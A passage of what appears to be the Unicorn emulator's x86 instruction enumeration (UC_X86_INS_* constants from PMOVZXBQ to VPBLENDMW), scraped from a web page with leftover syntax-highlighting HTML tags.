UC_X86_INS_PMOVZXBQ,<br><span class="hljs-number">563</span>    UC_X86_INS_PMOVZXBW,<br><span class="hljs-number">564</span>    UC_X86_INS_PMOVZXDQ,<br><span class="hljs-number">565</span>    UC_X86_INS_PMOVZXWD,<br><span class="hljs-number">566</span>    UC_X86_INS_PMOVZXWQ,<br><span class="hljs-number">567</span>    UC_X86_INS_PMULDQ,<br><span class="hljs-number">568</span>    UC_X86_INS_PMULHRW,<br><span class="hljs-number">569</span>    UC_X86_INS_PMULLD,<br><span class="hljs-number">570</span>    UC_X86_INS_POP,<br><span class="hljs-number">571</span>    UC_X86_INS_POPAW,<br><span class="hljs-number">572</span>    UC_X86_INS_POPAL,<br><span class="hljs-number">573</span>    UC_X86_INS_POPCNT,<br><span class="hljs-number">574</span>    UC_X86_INS_POPF,<br><span class="hljs-number">575</span>    UC_X86_INS_POPFD,<br><span class="hljs-number">576</span>    UC_X86_INS_POPFQ,<br><span class="hljs-number">577</span>    UC_X86_INS_PREFETCH,<br><span class="hljs-number">578</span>    UC_X86_INS_PREFETCHNTA,<br><span class="hljs-number">579</span>    UC_X86_INS_PREFETCHT0,<br><span class="hljs-number">580</span>    UC_X86_INS_PREFETCHT1,<br><span class="hljs-number">581</span>    UC_X86_INS_PREFETCHT2,<br><span class="hljs-number">582</span>    UC_X86_INS_PREFETCHW,<br><span class="hljs-number">583</span>    UC_X86_INS_PSHUFD,<br><span class="hljs-number">584</span>    UC_X86_INS_PSHUFHW,<br><span class="hljs-number">585</span>    UC_X86_INS_PSHUFLW,<br><span class="hljs-number">586</span>    UC_X86_INS_PSLLDQ,<br><span class="hljs-number">587</span>    UC_X86_INS_PSRLDQ,<br><span class="hljs-number">588</span>    UC_X86_INS_PSWAPD,<br><span class="hljs-number">589</span>    UC_X86_INS_PTEST,<br><span class="hljs-number">590</span>    UC_X86_INS_PUNPCKHQDQ,<br><span class="hljs-number">591</span>    UC_X86_INS_PUNPCKLQDQ,<br><span class="hljs-number">592</span>    UC_X86_INS_PUSH,<br><span class="hljs-number">593</span>    UC_X86_INS_PUSHAW,<br><span class="hljs-number">594</span>    UC_X86_INS_PUSHAL,<br><span class="hljs-number">595</span>    UC_X86_INS_PUSHF,<br><span class="hljs-number">596</span>    UC_X86_INS_PUSHFD,<br><span class="hljs-number">597</span>    UC_X86_INS_PUSHFQ,<br><span class="hljs-number">598</span>    UC_X86_INS_RCL,<br><span class="hljs-number">599</span>    UC_X86_INS_RCPPS,<br><span class="hljs-number">600</span>    UC_X86_INS_RCPSS,<br><span class="hljs-number">601</span>    UC_X86_INS_RCR,<br><span class="hljs-number">602</span>    UC_X86_INS_RDFSBASE,<br><span class="hljs-number">603</span>    UC_X86_INS_RDGSBASE,<br><span class="hljs-number">604</span>    UC_X86_INS_RDMSR,<br><span class="hljs-number">605</span>    UC_X86_INS_RDPMC,<br><span class="hljs-number">606</span>    UC_X86_INS_RDRAND,<br><span class="hljs-number">607</span>    UC_X86_INS_RDSEED,<br><span class="hljs-number">608</span>    UC_X86_INS_RDTSC,<br><span class="hljs-number">609</span>    UC_X86_INS_RDTSCP,<br><span class="hljs-number">610</span>    UC_X86_INS_ROL,<br><span class="hljs-number">611</span>    UC_X86_INS_ROR,<br><span class="hljs-number">612</span>    UC_X86_INS_RORX,<br><span class="hljs-number">613</span>    UC_X86_INS_ROUNDPD,<br><span class="hljs-number">614</span>    UC_X86_INS_ROUNDPS,<br><span class="hljs-number">615</span>    UC_X86_INS_ROUNDSD,<br><span class="hljs-number">616</span>    UC_X86_INS_ROUNDSS,<br><span class="hljs-number">617</span>    UC_X86_INS_RSM,<br><span class="hljs-number">618</span>    UC_X86_INS_RSQRTPS,<br><span class="hljs-number">619</span>    UC_X86_INS_RSQRTSS,<br><span class="hljs-number">620</span>    UC_X86_INS_SAHF,<br><span class="hljs-number">621</span>    UC_X86_INS_SAL,<br><span class="hljs-number">622</span>    UC_X86_INS_SALC,<br><span class="hljs-number">623</span>    UC_X86_INS_SAR,<br><span class="hljs-number">624</span>    UC_X86_INS_SARX,<br><span class="hljs-number">625</span>    UC_X86_INS_SBB,<br><span class="hljs-number">626</span>    UC_X86_INS_SCASB,<br><span class="hljs-number">627</span>    UC_X86_INS_SCASD,<br><span class="hljs-number">628</span>    UC_X86_INS_SCASQ,<br><span class="hljs-number">629</span>    UC_X86_INS_SCASW,<br><span class="hljs-number">630</span>    UC_X86_INS_SETAE,<br><span class="hljs-number">631</span>    UC_X86_INS_SETA,<br><span class="hljs-number">632</span>    UC_X86_INS_SETBE,<br><span class="hljs-number">633</span>    UC_X86_INS_SETB,<br><span class="hljs-number">634</span>    UC_X86_INS_SETE,<br><span class="hljs-number">635</span>    UC_X86_INS_SETGE,<br><span class="hljs-number">636</span>    UC_X86_INS_SETG,<br><span class="hljs-number">637</span>    UC_X86_INS_SETLE,<br><span class="hljs-number">638</span>    UC_X86_INS_SETL,<br><span class="hljs-number">639</span>    UC_X86_INS_SETNE,<br><span class="hljs-number">640</span>    UC_X86_INS_SETNO,<br><span class="hljs-number">641</span>    UC_X86_INS_SETNP,<br><span class="hljs-number">642</span>    UC_X86_INS_SETNS,<br><span class="hljs-number">643</span>    UC_X86_INS_SETO,<br><span class="hljs-number">644</span>    UC_X86_INS_SETP,<br><span class="hljs-number">645</span>    UC_X86_INS_SETS,<br><span class="hljs-number">646</span>    UC_X86_INS_SFENCE,<br><span class="hljs-number">647</span>    UC_X86_INS_SGDT,<br><span class="hljs-number">648</span>    UC_X86_INS_SHA1MSG1,<br><span class="hljs-number">649</span>    UC_X86_INS_SHA1MSG2,<br><span class="hljs-number">650</span>    UC_X86_INS_SHA1NEXTE,<br><span class="hljs-number">651</span>    UC_X86_INS_SHA1RNDS4,<br><span class="hljs-number">652</span>    UC_X86_INS_SHA256MSG1,<br><span class="hljs-number">653</span>    UC_X86_INS_SHA256MSG2,<br><span class="hljs-number">654</span>    UC_X86_INS_SHA256RNDS2,<br><span class="hljs-number">655</span>    UC_X86_INS_SHL,<br><span class="hljs-number">656</span>    UC_X86_INS_SHLD,<br><span class="hljs-number">657</span>    UC_X86_INS_SHLX,<br><span class="hljs-number">658</span>    UC_X86_INS_SHR,<br><span class="hljs-number">659</span>    UC_X86_INS_SHRD,<br><span class="hljs-number">660</span>    UC_X86_INS_SHRX,<br><span class="hljs-number">661</span>    UC_X86_INS_SHUFPD,<br><span class="hljs-number">662</span>    UC_X86_INS_SHUFPS,<br><span class="hljs-number">663</span>    UC_X86_INS_SIDT,<br><span class="hljs-number">664</span>    UC_X86_INS_FSIN,<br><span class="hljs-number">665</span>    UC_X86_INS_SKINIT,<br><span class="hljs-number">666</span>    UC_X86_INS_SLDT,<br><span class="hljs-number">667</span>    UC_X86_INS_SMSW,<br><span class="hljs-number">668</span>    UC_X86_INS_SQRTPD,<br><span class="hljs-number">669</span>    UC_X86_INS_SQRTPS,<br><span class="hljs-number">670</span>    UC_X86_INS_SQRTSD,<br><span class="hljs-number">671</span>    UC_X86_INS_SQRTSS,<br><span class="hljs-number">672</span>    UC_X86_INS_FSQRT,<br><span class="hljs-number">673</span>    UC_X86_INS_STAC,<br><span class="hljs-number">674</span>    UC_X86_INS_STC,<br><span class="hljs-number">675</span>    UC_X86_INS_STD,<br><span class="hljs-number">676</span>    UC_X86_INS_STGI,<br><span class="hljs-number">677</span>    UC_X86_INS_STI,<br><span class="hljs-number">678</span>    UC_X86_INS_STMXCSR,<br><span class="hljs-number">679</span>    UC_X86_INS_STOSB,<br><span class="hljs-number">680</span>    UC_X86_INS_STOSD,<br><span class="hljs-number">681</span>    UC_X86_INS_STOSQ,<br><span class="hljs-number">682</span>    UC_X86_INS_STOSW,<br><span class="hljs-number">683</span>    UC_X86_INS_STR,<br><span class="hljs-number">684</span>    UC_X86_INS_FST,<br><span class="hljs-number">685</span>    UC_X86_INS_FSTP,<br><span class="hljs-number">686</span>    UC_X86_INS_FSTPNCE,<br><span class="hljs-number">687</span>    UC_X86_INS_FXCH,<br><span class="hljs-number">688</span>    UC_X86_INS_SUBPD,<br><span class="hljs-number">689</span>    UC_X86_INS_SUBPS,<br><span class="hljs-number">690</span>    UC_X86_INS_FSUBR,<br><span class="hljs-number">691</span>    UC_X86_INS_FISUBR,<br><span class="hljs-number">692</span>    UC_X86_INS_FSUBRP,<br><span class="hljs-number">693</span>    UC_X86_INS_SUBSD,<br><span class="hljs-number">694</span>    UC_X86_INS_SUBSS,<br><span class="hljs-number">695</span>    UC_X86_INS_FSUB,<br><span class="hljs-number">696</span>    UC_X86_INS_FISUB,<br><span class="hljs-number">697</span>    UC_X86_INS_FSUBP,<br><span class="hljs-number">698</span>    UC_X86_INS_SWAPGS,<br><span class="hljs-number">699</span>    UC_X86_INS_SYSCALL,<br><span class="hljs-number">700</span>    UC_X86_INS_SYSENTER,<br><span class="hljs-number">701</span>    UC_X86_INS_SYSEXIT,<br><span class="hljs-number">702</span>    UC_X86_INS_SYSRET,<br><span class="hljs-number">703</span>    UC_X86_INS_T1MSKC,<br><span class="hljs-number">704</span>    UC_X86_INS_TEST,<br><span class="hljs-number">705</span>    UC_X86_INS_UD2,<br><span class="hljs-number">706</span>    UC_X86_INS_FTST,<br><span class="hljs-number">707</span>    UC_X86_INS_TZCNT,<br><span class="hljs-number">708</span>    UC_X86_INS_TZMSK,<br><span class="hljs-number">709</span>    UC_X86_INS_FUCOMPI,<br><span class="hljs-number">710</span>    UC_X86_INS_FUCOMI,<br><span class="hljs-number">711</span>    UC_X86_INS_FUCOMPP,<br><span class="hljs-number">712</span>    UC_X86_INS_FUCOMP,<br><span class="hljs-number">713</span>    UC_X86_INS_FUCOM,<br><span class="hljs-number">714</span>    UC_X86_INS_UD2B,<br><span class="hljs-number">715</span>    UC_X86_INS_UNPCKHPD,<br><span class="hljs-number">716</span>    UC_X86_INS_UNPCKHPS,<br><span class="hljs-number">717</span>    UC_X86_INS_UNPCKLPD,<br><span class="hljs-number">718</span>    UC_X86_INS_UNPCKLPS,<br><span class="hljs-number">719</span>    UC_X86_INS_VADDPD,<br><span class="hljs-number">720</span>    UC_X86_INS_VADDPS,<br><span class="hljs-number">721</span>    UC_X86_INS_VADDSD,<br><span class="hljs-number">722</span>    UC_X86_INS_VADDSS,<br><span class="hljs-number">723</span>    UC_X86_INS_VADDSUBPD,<br><span class="hljs-number">724</span>    UC_X86_INS_VADDSUBPS,<br><span class="hljs-number">725</span>    UC_X86_INS_VAESDECLAST,<br><span class="hljs-number">726</span>    UC_X86_INS_VAESDEC,<br><span class="hljs-number">727</span>    UC_X86_INS_VAESENCLAST,<br><span class="hljs-number">728</span>    UC_X86_INS_VAESENC,<br><span class="hljs-number">729</span>    UC_X86_INS_VAESIMC,<br><span class="hljs-number">730</span>    UC_X86_INS_VAESKEYGENASSIST,<br><span class="hljs-number">731</span>    UC_X86_INS_VALIGND,<br><span class="hljs-number">732</span>    UC_X86_INS_VALIGNQ,<br><span class="hljs-number">733</span>    UC_X86_INS_VANDNPD,<br><span class="hljs-number">734</span>    UC_X86_INS_VANDNPS,<br><span class="hljs-number">735</span>    UC_X86_INS_VANDPD,<br><span class="hljs-number">736</span>    UC_X86_INS_VANDPS,<br><span class="hljs-number">737</span>    UC_X86_INS_VBLENDMPD,<br><span class="hljs-number">738</span>    UC_X86_INS_VBLENDMPS,<br><span class="hljs-number">739</span>    UC_X86_INS_VBLENDPD,<br><span class="hljs-number">740</span>    UC_X86_INS_VBLENDPS,<br><span class="hljs-number">741</span>    UC_X86_INS_VBLENDVPD,<br><span class="hljs-number">742</span>    UC_X86_INS_VBLENDVPS,<br><span class="hljs-number">743</span>    UC_X86_INS_VBROADCASTF128,<br><span class="hljs-number">744</span>    UC_X86_INS_VBROADCASTI32X4,<br><span class="hljs-number">745</span>    UC_X86_INS_VBROADCASTI64X4,<br><span class="hljs-number">746</span>    UC_X86_INS_VBROADCASTSD,<br><span class="hljs-number">747</span>    UC_X86_INS_VBROADCASTSS,<br><span class="hljs-number">748</span>    UC_X86_INS_VCMPPD,<br><span class="hljs-number">749</span>    UC_X86_INS_VCMPPS,<br><span class="hljs-number">750</span>    UC_X86_INS_VCMPSD,<br><span class="hljs-number">751</span>    UC_X86_INS_VCMPSS,<br><span class="hljs-number">752</span>    UC_X86_INS_VCOMPRESSPD,<br><span class="hljs-number">753</span>    UC_X86_INS_VCOMPRESSPS,<br><span class="hljs-number">754</span>    UC_X86_INS_VCVTDQ2PD,<br><span class="hljs-number">755</span>    UC_X86_INS_VCVTDQ2PS,<br><span class="hljs-number">756</span>    UC_X86_INS_VCVTPD2DQX,<br><span class="hljs-number">757</span>    UC_X86_INS_VCVTPD2DQ,<br><span class="hljs-number">758</span>    UC_X86_INS_VCVTPD2PSX,<br><span class="hljs-number">759</span>    UC_X86_INS_VCVTPD2PS,<br><span class="hljs-number">760</span>    UC_X86_INS_VCVTPD2UDQ,<br><span class="hljs-number">761</span>    UC_X86_INS_VCVTPH2PS,<br><span class="hljs-number">762</span>    UC_X86_INS_VCVTPS2DQ,<br><span class="hljs-number">763</span>    UC_X86_INS_VCVTPS2PD,<br><span class="hljs-number">764</span>    UC_X86_INS_VCVTPS2PH,<br><span class="hljs-number">765</span>    UC_X86_INS_VCVTPS2UDQ,<br><span class="hljs-number">766</span>    UC_X86_INS_VCVTSD2SI,<br><span class="hljs-number">767</span>    UC_X86_INS_VCVTSD2USI,<br><span class="hljs-number">768</span>    UC_X86_INS_VCVTSS2SI,<br><span class="hljs-number">769</span>    UC_X86_INS_VCVTSS2USI,<br><span class="hljs-number">770</span>    UC_X86_INS_VCVTTPD2DQX,<br><span class="hljs-number">771</span>    UC_X86_INS_VCVTTPD2DQ,<br><span class="hljs-number">772</span>    UC_X86_INS_VCVTTPD2UDQ,<br><span class="hljs-number">773</span>    UC_X86_INS_VCVTTPS2DQ,<br><span class="hljs-number">774</span>    UC_X86_INS_VCVTTPS2UDQ,<br><span class="hljs-number">775</span>    UC_X86_INS_VCVTUDQ2PD,<br><span class="hljs-number">776</span>    UC_X86_INS_VCVTUDQ2PS,<br><span class="hljs-number">777</span>    UC_X86_INS_VDIVPD,<br><span class="hljs-number">778</span>    UC_X86_INS_VDIVPS,<br><span class="hljs-number">779</span>    UC_X86_INS_VDIVSD,<br><span class="hljs-number">780</span>    UC_X86_INS_VDIVSS,<br><span class="hljs-number">781</span>    UC_X86_INS_VDPPD,<br><span class="hljs-number">782</span>    UC_X86_INS_VDPPS,<br><span class="hljs-number">783</span>    UC_X86_INS_VERR,<br><span class="hljs-number">784</span>    UC_X86_INS_VERW,<br><span class="hljs-number">785</span>    UC_X86_INS_VEXP2PD,<br><span class="hljs-number">786</span>    UC_X86_INS_VEXP2PS,<br><span class="hljs-number">787</span>    UC_X86_INS_VEXPANDPD,<br><span class="hljs-number">788</span>    UC_X86_INS_VEXPANDPS,<br><span class="hljs-number">789</span>    UC_X86_INS_VEXTRACTF128,<br><span class="hljs-number">790</span>    UC_X86_INS_VEXTRACTF32X4,<br><span class="hljs-number">791</span>    UC_X86_INS_VEXTRACTF64X4,<br><span class="hljs-number">792</span>    UC_X86_INS_VEXTRACTI128,<br><span class="hljs-number">793</span>    UC_X86_INS_VEXTRACTI32X4,<br><span class="hljs-number">794</span>    UC_X86_INS_VEXTRACTI64X4,<br><span class="hljs-number">795</span>    UC_X86_INS_VEXTRACTPS,<br><span class="hljs-number">796</span>    UC_X86_INS_VFMADD132PD,<br><span class="hljs-number">797</span>    UC_X86_INS_VFMADD132PS,<br><span class="hljs-number">798</span>    UC_X86_INS_VFMADDPD,<br><span class="hljs-number">799</span>    UC_X86_INS_VFMADD213PD,<br><span class="hljs-number">800</span>    UC_X86_INS_VFMADD231PD,<br><span class="hljs-number">801</span>    UC_X86_INS_VFMADDPS,<br><span class="hljs-number">802</span>    UC_X86_INS_VFMADD213PS,<br><span class="hljs-number">803</span>    UC_X86_INS_VFMADD231PS,<br><span class="hljs-number">804</span>    UC_X86_INS_VFMADDSD,<br><span class="hljs-number">805</span>    UC_X86_INS_VFMADD213SD,<br><span class="hljs-number">806</span>    UC_X86_INS_VFMADD132SD,<br><span class="hljs-number">807</span>    UC_X86_INS_VFMADD231SD,<br><span class="hljs-number">808</span>    UC_X86_INS_VFMADDSS,<br><span class="hljs-number">809</span>    UC_X86_INS_VFMADD213SS,<br><span class="hljs-number">810</span>    UC_X86_INS_VFMADD132SS,<br><span class="hljs-number">811</span>    UC_X86_INS_VFMADD231SS,<br><span class="hljs-number">812</span>    UC_X86_INS_VFMADDSUB132PD,<br><span class="hljs-number">813</span>    UC_X86_INS_VFMADDSUB132PS,<br><span class="hljs-number">814</span>    UC_X86_INS_VFMADDSUBPD,<br><span class="hljs-number">815</span>    UC_X86_INS_VFMADDSUB213PD,<br><span class="hljs-number">816</span>    UC_X86_INS_VFMADDSUB231PD,<br><span class="hljs-number">817</span>    UC_X86_INS_VFMADDSUBPS,<br><span class="hljs-number">818</span>    UC_X86_INS_VFMADDSUB213PS,<br><span class="hljs-number">819</span>    UC_X86_INS_VFMADDSUB231PS,<br><span class="hljs-number">820</span>    UC_X86_INS_VFMSUB132PD,<br><span class="hljs-number">821</span>    UC_X86_INS_VFMSUB132PS,<br><span class="hljs-number">822</span>    UC_X86_INS_VFMSUBADD132PD,<br><span class="hljs-number">823</span>    UC_X86_INS_VFMSUBADD132PS,<br><span class="hljs-number">824</span>    UC_X86_INS_VFMSUBADDPD,<br><span class="hljs-number">825</span>    UC_X86_INS_VFMSUBADD213PD,<br><span class="hljs-number">826</span>    UC_X86_INS_VFMSUBADD231PD,<br><span class="hljs-number">827</span>    UC_X86_INS_VFMSUBADDPS,<br><span class="hljs-number">828</span>    UC_X86_INS_VFMSUBADD213PS,<br><span class="hljs-number">829</span>    UC_X86_INS_VFMSUBADD231PS,<br><span class="hljs-number">830</span>    UC_X86_INS_VFMSUBPD,<br><span class="hljs-number">831</span>    UC_X86_INS_VFMSUB213PD,<br><span class="hljs-number">832</span>    UC_X86_INS_VFMSUB231PD,<br><span class="hljs-number">833</span>    UC_X86_INS_VFMSUBPS,<br><span class="hljs-number">834</span>    UC_X86_INS_VFMSUB213PS,<br><span class="hljs-number">835</span>    UC_X86_INS_VFMSUB231PS,<br><span class="hljs-number">836</span>    UC_X86_INS_VFMSUBSD,<br><span class="hljs-number">837</span>    UC_X86_INS_VFMSUB213SD,<br><span class="hljs-number">838</span>    UC_X86_INS_VFMSUB132SD,<br><span class="hljs-number">839</span>    UC_X86_INS_VFMSUB231SD,<br><span class="hljs-number">840</span>    UC_X86_INS_VFMSUBSS,<br><span class="hljs-number">841</span>    UC_X86_INS_VFMSUB213SS,<br><span class="hljs-number">842</span>    UC_X86_INS_VFMSUB132SS,<br><span class="hljs-number">843</span>    UC_X86_INS_VFMSUB231SS,<br><span class="hljs-number">844</span>    UC_X86_INS_VFNMADD132PD,<br><span class="hljs-number">845</span>    UC_X86_INS_VFNMADD132PS,<br><span class="hljs-number">846</span>    UC_X86_INS_VFNMADDPD,<br><span class="hljs-number">847</span>    UC_X86_INS_VFNMADD213PD,<br><span class="hljs-number">848</span>    UC_X86_INS_VFNMADD231PD,<br><span class="hljs-number">849</span>    UC_X86_INS_VFNMADDPS,<br><span class="hljs-number">850</span>    UC_X86_INS_VFNMADD213PS,<br><span class="hljs-number">851</span>    UC_X86_INS_VFNMADD231PS,<br><span class="hljs-number">852</span>    UC_X86_INS_VFNMADDSD,<br><span class="hljs-number">853</span>    UC_X86_INS_VFNMADD213SD,<br><span class="hljs-number">854</span>    UC_X86_INS_VFNMADD132SD,<br><span class="hljs-number">855</span>    UC_X86_INS_VFNMADD231SD,<br><span class="hljs-number">856</span>    UC_X86_INS_VFNMADDSS,<br><span class="hljs-number">857</span>    UC_X86_INS_VFNMADD213SS,<br><span class="hljs-number">858</span>    UC_X86_INS_VFNMADD132SS,<br><span class="hljs-number">859</span>    UC_X86_INS_VFNMADD231SS,<br><span class="hljs-number">860</span>    UC_X86_INS_VFNMSUB132PD,<br><span class="hljs-number">861</span>    UC_X86_INS_VFNMSUB132PS,<br><span class="hljs-number">862</span>    UC_X86_INS_VFNMSUBPD,<br><span class="hljs-number">863</span>    UC_X86_INS_VFNMSUB213PD,<br><span class="hljs-number">864</span>    UC_X86_INS_VFNMSUB231PD,<br><span class="hljs-number">865</span>    UC_X86_INS_VFNMSUBPS,<br><span class="hljs-number">866</span>    UC_X86_INS_VFNMSUB213PS,<br><span class="hljs-number">867</span>    UC_X86_INS_VFNMSUB231PS,<br><span class="hljs-number">868</span>    UC_X86_INS_VFNMSUBSD,<br><span class="hljs-number">869</span>    UC_X86_INS_VFNMSUB213SD,<br><span class="hljs-number">870</span>    UC_X86_INS_VFNMSUB132SD,<br><span class="hljs-number">871</span>    UC_X86_INS_VFNMSUB231SD,<br><span class="hljs-number">872</span>    UC_X86_INS_VFNMSUBSS,<br><span class="hljs-number">873</span>    UC_X86_INS_VFNMSUB213SS,<br><span class="hljs-number">874</span>    UC_X86_INS_VFNMSUB132SS,<br><span class="hljs-number">875</span>    UC_X86_INS_VFNMSUB231SS,<br><span class="hljs-number">876</span>    UC_X86_INS_VFRCZPD,<br><span class="hljs-number">877</span>    UC_X86_INS_VFRCZPS,<br><span class="hljs-number">878</span>    UC_X86_INS_VFRCZSD,<br><span class="hljs-number">879</span>    UC_X86_INS_VFRCZSS,<br><span class="hljs-number">880</span>    UC_X86_INS_VORPD,<br><span class="hljs-number">881</span>    UC_X86_INS_VORPS,<br><span class="hljs-number">882</span>    UC_X86_INS_VXORPD,<br><span class="hljs-number">883</span>    UC_X86_INS_VXORPS,<br><span class="hljs-number">884</span>    UC_X86_INS_VGATHERDPD,<br><span class="hljs-number">885</span>    UC_X86_INS_VGATHERDPS,<br><span class="hljs-number">886</span>    UC_X86_INS_VGATHERPF0DPD,<br><span class="hljs-number">887</span>    UC_X86_INS_VGATHERPF0DPS,<br><span class="hljs-number">888</span>    UC_X86_INS_VGATHERPF0QPD,<br><span class="hljs-number">889</span>    UC_X86_INS_VGATHERPF0QPS,<br><span class="hljs-number">890</span>    UC_X86_INS_VGATHERPF1DPD,<br><span class="hljs-number">891</span>    UC_X86_INS_VGATHERPF1DPS,<br><span class="hljs-number">892</span>    UC_X86_INS_VGATHERPF1QPD,<br><span class="hljs-number">893</span>    UC_X86_INS_VGATHERPF1QPS,<br><span class="hljs-number">894</span>    UC_X86_INS_VGATHERQPD,<br><span class="hljs-number">895</span>    UC_X86_INS_VGATHERQPS,<br><span class="hljs-number">896</span>    UC_X86_INS_VHADDPD,<br><span class="hljs-number">897</span>    UC_X86_INS_VHADDPS,<br><span class="hljs-number">898</span>    UC_X86_INS_VHSUBPD,<br><span class="hljs-number">899</span>    UC_X86_INS_VHSUBPS,<br><span class="hljs-number">900</span>    UC_X86_INS_VINSERTF128,<br><span class="hljs-number">901</span>    UC_X86_INS_VINSERTF32X4,<br><span class="hljs-number">902</span>    UC_X86_INS_VINSERTF32X8,<br><span class="hljs-number">903</span>    UC_X86_INS_VINSERTF64X2,<br><span class="hljs-number">904</span>    UC_X86_INS_VINSERTF64X4,<br><span class="hljs-number">905</span>    UC_X86_INS_VINSERTI128,<br><span class="hljs-number">906</span>    UC_X86_INS_VINSERTI32X4,<br><span class="hljs-number">907</span>    UC_X86_INS_VINSERTI32X8,<br><span class="hljs-number">908</span>    UC_X86_INS_VINSERTI64X2,<br><span class="hljs-number">909</span>    UC_X86_INS_VINSERTI64X4,<br><span class="hljs-number">910</span>    UC_X86_INS_VINSERTPS,<br><span class="hljs-number">911</span>    UC_X86_INS_VLDDQU,<br><span class="hljs-number">912</span>    UC_X86_INS_VLDMXCSR,<br><span class="hljs-number">913</span>    UC_X86_INS_VMASKMOVDQU,<br><span class="hljs-number">914</span>    UC_X86_INS_VMASKMOVPD,<br><span class="hljs-number">915</span>    UC_X86_INS_VMASKMOVPS,<br><span class="hljs-number">916</span>    UC_X86_INS_VMAXPD,<br><span class="hljs-number">917</span>    UC_X86_INS_VMAXPS,<br><span class="hljs-number">918</span>    UC_X86_INS_VMAXSD,<br><span class="hljs-number">919</span>    UC_X86_INS_VMAXSS,<br><span class="hljs-number">920</span>    UC_X86_INS_VMCALL,<br><span class="hljs-number">921</span>    UC_X86_INS_VMCLEAR,<br><span class="hljs-number">922</span>    UC_X86_INS_VMFUNC,<br><span class="hljs-number">923</span>    UC_X86_INS_VMINPD,<br><span class="hljs-number">924</span>    UC_X86_INS_VMINPS,<br><span class="hljs-number">925</span>    UC_X86_INS_VMINSD,<br><span class="hljs-number">926</span>    UC_X86_INS_VMINSS,<br><span class="hljs-number">927</span>    UC_X86_INS_VMLAUNCH,<br><span class="hljs-number">928</span>    UC_X86_INS_VMLOAD,<br><span class="hljs-number">929</span>    UC_X86_INS_VMMCALL,<br><span class="hljs-number">930</span>    UC_X86_INS_VMOVQ,<br><span class="hljs-number">931</span>    UC_X86_INS_VMOVDDUP,<br><span class="hljs-number">932</span>    UC_X86_INS_VMOVD,<br><span class="hljs-number">933</span>    UC_X86_INS_VMOVDQA32,<br><span class="hljs-number">934</span>    UC_X86_INS_VMOVDQA64,<br><span class="hljs-number">935</span>    UC_X86_INS_VMOVDQA,<br><span class="hljs-number">936</span>    UC_X86_INS_VMOVDQU16,<br><span class="hljs-number">937</span>    UC_X86_INS_VMOVDQU32,<br><span class="hljs-number">938</span>    UC_X86_INS_VMOVDQU64,<br><span class="hljs-number">939</span>    UC_X86_INS_VMOVDQU8,<br><span class="hljs-number">940</span>    UC_X86_INS_VMOVDQU,<br><span class="hljs-number">941</span>    UC_X86_INS_VMOVHLPS,<br><span class="hljs-number">942</span>    UC_X86_INS_VMOVHPD,<br><span class="hljs-number">943</span>    UC_X86_INS_VMOVHPS,<br><span class="hljs-number">944</span>    UC_X86_INS_VMOVLHPS,<br><span class="hljs-number">945</span>    UC_X86_INS_VMOVLPD,<br><span class="hljs-number">946</span>    UC_X86_INS_VMOVLPS,<br><span class="hljs-number">947</span>    UC_X86_INS_VMOVMSKPD,<br><span class="hljs-number">948</span>    UC_X86_INS_VMOVMSKPS,<br><span class="hljs-number">949</span>    UC_X86_INS_VMOVNTDQA,<br><span class="hljs-number">950</span>    UC_X86_INS_VMOVNTDQ,<br><span class="hljs-number">951</span>    UC_X86_INS_VMOVNTPD,<br><span class="hljs-number">952</span>    UC_X86_INS_VMOVNTPS,<br><span class="hljs-number">953</span>    UC_X86_INS_VMOVSD,<br><span class="hljs-number">954</span>    UC_X86_INS_VMOVSHDUP,<br><span class="hljs-number">955</span>    UC_X86_INS_VMOVSLDUP,<br><span class="hljs-number">956</span>    UC_X86_INS_VMOVSS,<br><span class="hljs-number">957</span>    UC_X86_INS_VMOVUPD,<br><span class="hljs-number">958</span>    UC_X86_INS_VMOVUPS,<br><span class="hljs-number">959</span>    UC_X86_INS_VMPSADBW,<br><span class="hljs-number">960</span>    UC_X86_INS_VMPTRLD,<br><span class="hljs-number">961</span>    UC_X86_INS_VMPTRST,<br><span class="hljs-number">962</span>    UC_X86_INS_VMREAD,<br><span class="hljs-number">963</span>    UC_X86_INS_VMRESUME,<br><span class="hljs-number">964</span>    UC_X86_INS_VMRUN,<br><span class="hljs-number">965</span>    UC_X86_INS_VMSAVE,<br><span class="hljs-number">966</span>    UC_X86_INS_VMULPD,<br><span class="hljs-number">967</span>    UC_X86_INS_VMULPS,<br><span class="hljs-number">968</span>    UC_X86_INS_VMULSD,<br><span class="hljs-number">969</span>    UC_X86_INS_VMULSS,<br><span class="hljs-number">970</span>    UC_X86_INS_VMWRITE,<br><span class="hljs-number">971</span>    UC_X86_INS_VMXOFF,<br><span class="hljs-number">972</span>    UC_X86_INS_VMXON,<br><span class="hljs-number">973</span>    UC_X86_INS_VPABSB,<br><span class="hljs-number">974</span>    UC_X86_INS_VPABSD,<br><span class="hljs-number">975</span>    UC_X86_INS_VPABSQ,<br><span class="hljs-number">976</span>    UC_X86_INS_VPABSW,<br><span class="hljs-number">977</span>    UC_X86_INS_VPACKSSDW,<br><span class="hljs-number">978</span>    UC_X86_INS_VPACKSSWB,<br><span class="hljs-number">979</span>    UC_X86_INS_VPACKUSDW,<br><span class="hljs-number">980</span>    UC_X86_INS_VPACKUSWB,<br><span class="hljs-number">981</span>    UC_X86_INS_VPADDB,<br><span class="hljs-number">982</span>    UC_X86_INS_VPADDD,<br><span class="hljs-number">983</span>    UC_X86_INS_VPADDQ,<br><span class="hljs-number">984</span>    UC_X86_INS_VPADDSB,<br><span class="hljs-number">985</span>    UC_X86_INS_VPADDSW,<br><span class="hljs-number">986</span>    UC_X86_INS_VPADDUSB,<br><span class="hljs-number">987</span>    UC_X86_INS_VPADDUSW,<br><span class="hljs-number">988</span>    UC_X86_INS_VPADDW,<br><span class="hljs-number">989</span>    UC_X86_INS_VPALIGNR,<br><span class="hljs-number">990</span>    UC_X86_INS_VPANDD,<br><span class="hljs-number">991</span>    UC_X86_INS_VPANDND,<br><span class="hljs-number">992</span>    UC_X86_INS_VPANDNQ,<br><span class="hljs-number">993</span>    UC_X86_INS_VPANDN,<br><span class="hljs-number">994</span>    UC_X86_INS_VPANDQ,<br><span class="hljs-number">995</span>    UC_X86_INS_VPAND,<br><span class="hljs-number">996</span>    UC_X86_INS_VPAVGB,<br><span class="hljs-number">997</span>    UC_X86_INS_VPAVGW,<br><span class="hljs-number">998</span>    UC_X86_INS_VPBLENDD,<br><span class="hljs-number">999</span>    UC_X86_INS_VPBLENDMB,<br><span class="hljs-number">1000</span>    UC_X86_INS_VPBLENDMD,<br><span class="hljs-number">1001</span>    UC_X86_INS_VPBLENDMQ,<br><span class="hljs-number">1002</span>    UC_X86_INS_VPBLENDMW,<br><span class="hljs-number">1003</span>    